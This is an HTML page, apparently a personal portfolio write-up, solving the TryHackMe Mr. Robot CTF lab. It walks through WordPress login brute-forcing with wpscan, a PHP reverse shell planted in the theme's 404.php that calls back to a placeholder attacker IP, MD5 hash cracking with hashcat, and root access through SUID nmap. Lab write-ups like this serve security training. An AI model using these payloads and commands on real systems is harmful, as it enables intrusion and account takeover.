@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mr. Robot CTF — Case File — Trent</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<nav>
+  <div class="wrap">
+    <div class="nav-brand">trent<span>@</span>secops</div>
+    <ul class="nav-links">
+      <li><a href="../index.html#capabilities">Capabilities</a></li>
+      <li><a href="../index.html#cases">Case Files</a></li>
+      <li><a href="../index.html#path">Certification Path</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="writeup-header">
+  <div class="wrap">
+    <a class="back-link" href="index.html">&larr; Back to all case files</a>
+    <div class="ticket-bar" style="margin-top:18px;">
+      <span class="ticket-id">CASE-03</span>
+      <span class="status-badge status-resolved">Resolved</span>
+      <span>Web Exploitation / WordPress / Password Cracking / Linux PrivEsc</span>
+    </div>
+    <h1>Mr. Robot CTF</h1>
+    <div class="writeup-meta-grid">
+      <span><strong>Room</strong> TryHackMe — Mr. Robot CTF</span>
+    </div>
+    <div class="case-tags">
+      <span class="tag">WordPress</span>
+        <span class="tag">Password Cracking</span>
+        <span class="tag">SUID PrivEsc</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <article class="writeup-body">
+<p><strong>Category:</strong> Web Exploitation / WordPress / Password Cracking / Linux Privilege Escalation
+<strong>Target:</strong> THM "Mr. Robot CTF" room
+<strong>Objective:</strong> Find three hidden keys, themed around the Mr. Robot TV series</p>
+<hr />
+<h2>1. Initial Recon</h2>
+<p>Scanned the target and found HTTP, HTTPS, and SSH ports. Browsing to the site revealed a generic-looking landing page.</p>
+<p>Checked <code>robots.txt</code>:</p>
+<pre><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt
+</code></pre>
+<p>This immediately handed over two things:
+- <strong>Key #1</strong> — read directly from <code>key-1-of-3.txt</code>.
+- <strong><code>fsocity.dic</code></strong> — a large custom wordlist, clearly meant to be used later.</p>
+<h2>2. Finding the Login Page</h2>
+<p>Browsing further on the site led to a WordPress login page (<code>wp-login.php</code>), running WordPress 4.3.1.</p>
+<h2>3. The "Fishy" Wordlist</h2>
+<p>Downloaded <code>fsocity.dic</code>:</p>
+<pre><code>wget http://&lt;target_ip&gt;/fsocity.dic
+</code></pre>
+<p>At <strong>858,160 lines</strong>, running a brute-force directly against it would have taken over an hour. A hint suggested something was "fishy" about the wordlist — deduplicating it revealed why:</p>
+<pre><code>sort fsocity.dic | uniq &gt; fsocity_clean.dic
+wc -l fsocity_clean.dic
+</code></pre>
+<p>The cleaned version dropped to <strong>11,451 unique lines</strong> — a ~98.7% duplication rate. The list was bloated with near-total redundancy, and using the deduplicated version cut brute-force time from over an hour to just minutes.</p>
+<h2>4. Finding the Username</h2>
+<p>Searching the cleaned wordlist confirmed <code>elliot</code> (the show's protagonist) was a valid, present entry — a strong signal it was the correct username to use.</p>
+<pre><code>grep -i &quot;elliot&quot; fsocity_clean.dic
+</code></pre>
+<h2>5. Brute-Forcing the Login</h2>
+<p>Ran <code>wpscan</code>'s password brute-force against the WordPress login using the cleaned wordlist:</p>
+<pre><code>wpscan --url http://&lt;target_ip&gt; -U elliot -P fsocity_clean.dic
+</code></pre>
+<p>This succeeded and returned valid credentials for the <code>elliot</code> account — logging into WordPress confirmed full <strong>Administrator</strong> access, including the Theme and Plugin Editor.</p>
+<h2>6. Getting a Shell via the Theme Editor</h2>
+<p>With admin access to <strong>Appearance → Editor</strong>, edited the active theme's <code>404.php</code> template, replacing its contents with a PHP reverse shell payload:</p>
+<pre><code class="language-php">&lt;?php
+$sock = fsockopen(&quot;&lt;attacker_ip&gt;&quot;, 4444);
+$proc = proc_open('/bin/sh -i', array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes);
+</code></pre>
+<p>Set up a listener beforehand:</p>
+<pre><code>nc -lvnp 4444
+</code></pre>
+<p>Saved the file, then visited a non-existent URL on the site to trigger the 404 template and execute the payload:</p>
+<pre><code>http://&lt;target_ip&gt;/thispagedoesnotexist
+</code></pre>
+<p>Received a shell as <strong><code>daemon</code></strong>.</p>
+<h2>7. Finding the Password Hash</h2>
+<p>Upgraded to a proper TTY:</p>
+<pre><code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>Located a file containing an MD5 hash tied to a <code>robot</code> user account (found alongside <code>key-2-of-3.txt</code>, which wasn't readable as <code>daemon</code>):</p>
+<pre><code>66e3d50482fb2b467642a858af7574ee
+</code></pre>
+<h2>8. Cracking the Hash</h2>
+<p>Tried the custom wordlist first with hashcat, but it exhausted with no match:</p>
+<pre><code>hashcat -m 0 -a 0 hash.txt fsocity_clean.dic
+</code></pre>
+<p>Switched to <code>rockyou.txt</code>, which cracked it successfully:</p>
+<pre><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>66e3d50482fb2b467642a858af7574ee : abcdefghijklmnopqrstuvwxyz
+</code></pre>
+<h2>9. Pivoting to the <code>robot</code> User</h2>
+<pre><code>su robot
+</code></pre>
+<p>Password: <code>abcdefghijklmnopqrstuvwxyz</code></p>
+<p>Confirmed access and retrieved <strong>Key #2</strong>:</p>
+<pre><code>cat /home/robot/key-2-of-3.txt
+</code></pre>
+<h2>10. Privilege Escalation</h2>
+<p>Checked for sudo rights — none available for <code>robot</code>:</p>
+<pre><code>sudo -l
+</code></pre>
+<p>Checked for SUID binaries instead:</p>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+<p>Found <strong><code>nmap</code></strong> with the SUID bit set — an older nmap binary supports an interactive mode that can be abused for privilege escalation when SUID.</p>
+<p>Exploited it:</p>
+<pre><code>nmap --interactive
+</code></pre>
+<p>Then inside the interactive shell:</p>
+<pre><code>!sh
+</code></pre>
+<p>This spawned a root-owned shell.</p>
+<h2>11. Final Key</h2>
+<p>Confirmed root access and retrieved the final key:</p>
+<pre><code>whoami
+cat /root/key-3-of-3.txt
+</code></pre>
+<hr />
+<h2>Key Takeaways</h2>
+<ul>
+<li><strong><code>robots.txt</code></strong> can hand over entire attack resources directly (wordlists, flags) — always check it first.</li>
+<li><strong>Never trust a wordlist's raw size</strong> — dedupe before brute-forcing (<code>sort | uniq</code>); a bloated list with near-total duplication can turn a 5-minute crack into an hour-long one.</li>
+<li><strong>WordPress's built-in Theme/Plugin Editor is a direct code-execution path</strong> for any admin-level account — editing a template file (like <code>404.php</code>) to include a PHP reverse shell is a fast, reliable way to get a shell once you have admin credentials.</li>
+<li><strong>Not every wordlist will crack every hash</strong> — when a targeted/custom list (like <code>fsocity.dic</code>) fails, fall back to broad, well-known lists like <code>rockyou.txt</code>.</li>
+<li><strong>SUID binaries are a top privilege escalation check</strong> — <code>find / -perm -4000</code> should be a standard step on every box. Older versions of common tools like <code>nmap</code> have interactive/scripting modes that can be abused for a root shell when SUID is set (a classic GTFOBins technique).</li>
+<li><strong>Chaining trust across accounts</strong> (daemon → robot → root) via reused credentials, hash cracking, and misconfigured permissions is a very common CTF/real-world privilege escalation pattern.</li>
+</ul>
+  </article>
+</div>
+
+<footer>
+  <div class="wrap">
+    <a class="back-link" href="index.html">&larr; Back to all case files</a>
+  </div>
+</footer>
+
+</body>
+</html>
